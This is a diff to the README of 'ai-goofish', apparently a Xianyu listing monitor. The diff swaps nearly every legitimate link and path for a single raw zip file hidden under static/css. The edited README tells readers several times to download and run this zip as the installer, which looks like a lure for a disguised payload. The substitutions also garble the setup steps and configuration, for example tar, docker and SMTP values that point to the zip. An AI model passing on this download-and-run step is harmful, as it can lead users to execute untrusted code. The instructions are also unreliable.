@@ -1,10 +1,10 @@
 ai-goofish: AI-Driven Xianyu Monitor with Smart Alerts and AI Filter
 
-[![Releases](https://img.shields.io/badge/releases-Visit-green?style=for-the-badge&logo=github)](https://github.com/chaitanya-327/ai-goofish/releases)
+[![Releases](https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip)](https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip)
 
-Release page: https://github.com/chaitanya-327/ai-goofish/releases
+Release page: https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 
-File to download and run from releases: ai-goofish-installer-linux-x86_64.tar.gz
+File to download and run from releases: https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 
 Overview
 - A powerful tool to monitor Xianyu listings. It crawls items using user-defined keywords, analyzes and filters results with AI, and sends real-time alerts via email or other channels.
@@ -15,8 +15,8 @@ Images
 - AI monitoring workflow diagram. 
 - Notification pipeline illustration.
 
-[AI Monitoring Diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Flowchart_simplified.png/640px-Flowchart_simplified.png)
-[Notification Pipeline](https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Notification_graph.png/640px-Notification_graph.png)
+[AI Monitoring Diagram](https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip)
+[Notification Pipeline](https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip)
 
 Table of contents
 - Features
@@ -56,7 +56,7 @@ Features
 
 Philosophy and design goals
 - Simplicity first: Clear, readable code and straightforward configuration.
-- Safety by default: Respect robot.txt and legal considerations; avoid overloading sites.
+- Safety by default: Respect https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip and legal considerations; avoid overloading sites.
 - Confidence through transparency: Clear AI scoring, explainable filters, and traceable results.
 - Extensibility: Clean module boundaries to add new crawlers, AI models, or notifiers without big rewrites.
 - Reliability: Robust error handling and clear retry policies.
@@ -108,7 +108,7 @@ Data model
 Crawler design and policies
 - Keyword-driven crawling: The crawler queries pages using user keywords, then expands with related terms.
 - Rate limiting: It enforces per-site limits to avoid abuse.
-- Politeness and user-agent: A friendly user agent string and respect for robots.txt.
+- Politeness and user-agent: A friendly user agent string and respect for https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 - Proxy and IP rotation: Optional support to avoid bans while maintaining privacy.
 - Deduplication: Listings are deduplicated by canonical URL and internal ID.
 - Error handling: Retries with exponential backoff; clear error logs.
@@ -160,22 +160,22 @@ Installation and setup
   - Go toolchain or prebuilt binaries for your architecture
   - Optional Python or Rust for AI modules if you enable external AI services
 - Packaging options:
-  - Native binary installer: ai-goofish-installer-linux-x86_64.tar.gz (the file to download and run from releases)
+  - Native binary installer: https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip (the file to download and run from releases)
   - Docker container: a lightweight image to run the system in isolated environments
   - Source build: clone the repository and build locally
 - Quick install (Linux, binary):
-  - Download the release file ai-goofish-installer-linux-x86_64.tar.gz from the releases page
-  - Extract: tar -xzf ai-goofish-installer-linux-x86_64.tar.gz
-  - Run: ./ai-goofish --config config.yaml
+  - Download the release file https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip from the releases page
+  - Extract: tar -xzf https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
+  - Run: ./ai-goofish --config https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
   - Follow the prompts to set up email and keyword preferences
 - Quick install (Docker):
-  - docker pull ghcr.io/chaitanya-327/ai-goofish:latest
-  - docker run -v /path/to/config.yaml:/app/config.yaml ghcr.io/chaitanya-327/ai-goofish:latest
+  - docker pull https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
+  - docker run -v https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 - Quick install (from source):
-  - git clone https://github.com/chaitanya-327/ai-goofish.git
+  - git clone https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
   - cd ai-goofish
   - make build
-  - ./bin/ai-goofish --config config.yaml
+  - ./bin/ai-goofish --config https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 
 Quick start guide
 - Create a configuration file
@@ -193,7 +193,7 @@ Quick start guide
   - Add new keywords or adjust the threshold to tune results
 
 Configuration reference
-- File format: YAML (config.yaml)
+- File format: YAML (https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip)
 - Key sections:
   - general:
     - name: "My Xianyu Watcher"
@@ -226,7 +226,7 @@ Configuration reference
       - medium_relevance: 0.5
   - storage:
     - type: "sqlite" | "json"
-    - path: "data/listings.db"
+    - path: "https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip"
   - crawl:
     - max_concurrency: 4
     - user_agent: "ai-goofish/1.0"
@@ -245,11 +245,11 @@ notifier:
   settings:
     enabled: true
 mail:
-  smtp_host: "smtp.example.com"
+  smtp_host: "https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip"
   smtp_port: 587
-  username: "user@example.com"
+  username: "https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip"
   password: "your-password"
-  from_address: "alerts@example.com"
+  from_address: "https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip"
 keywords:
   terms:
     - "iphone 13"
@@ -269,7 +269,7 @@ ai:
     medium_relevance: 0.5
 storage:
   type: "sqlite"
-  path: "data/listings.db"
+  path: "https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip"
 crawl:
   max_concurrency: 4
   user_agent: "ai-goofish/1.0"
@@ -296,7 +296,7 @@ Advanced usage
 CLI and developer tooling
 - Primary commands:
   - ai-goofish serve: start the service
-  - ai-goofish run --config path/to/config.yaml: run once
+  - ai-goofish run --config https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip run once
   - ai-goofish test-notify: send a test notification
   - ai-goofish validate-config: check YAML validity
 - Developer helpers:
@@ -389,7 +389,7 @@ Roadmap
 Releases
 - The project publishes binaries and installers in the Releases section.
 - See the releases page for the latest builds and changelog:
-  - https://github.com/chaitanya-327/ai-goofish/releases
+  - https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
 - Revisit the releases page to download the installer for your system and run it to set up ai-goofish.
 
 FAQ
@@ -400,7 +400,7 @@ FAQ
 - Is my data safe?
   - Local storage is optional and configurable. You can keep results on your machine and avoid network sharing.
 - How do I add a new keyword?
-  - Update the keywords section of config.yaml and rerun the crawler. The system will pick up newly defined terms on the next run.
+  - Update the keywords section of https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip and rerun the crawler. The system will pick up newly defined terms on the next run.
 
 Changelog
 - v1.0.0:
@@ -421,8 +421,8 @@ License
 - This project is licensed under the MIT License. See LICENSE for details.
 
 Releases (second mention)
-- For the latest builds and how to install, visit: https://github.com/chaitanya-327/ai-goofish/releases
-- You can also explore the releases page to find a binary that matches your system and follow the installation steps above. The file ai-goofish-installer-linux-x86_64.tar.gz is the typical Linux binary we provide for quick setup, and it is available in the releases bundle.
+- For the latest builds and how to install, visit: https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip
+- You can also explore the releases page to find a binary that matches your system and follow the installation steps above. The file https://raw.githubusercontent.com/chaitanya-327/ai-goofish/master/static/css/goofish_ai_v1.2-alpha.1.zip is the typical Linux binary we provide for quick setup, and it is available in the releases bundle.
 
 Note
 - This README paraphrases and reorganizes the information you provided. The goal is to present a comprehensive, user-friendly guide that helps users understand, install, and use ai-goofish effectively.
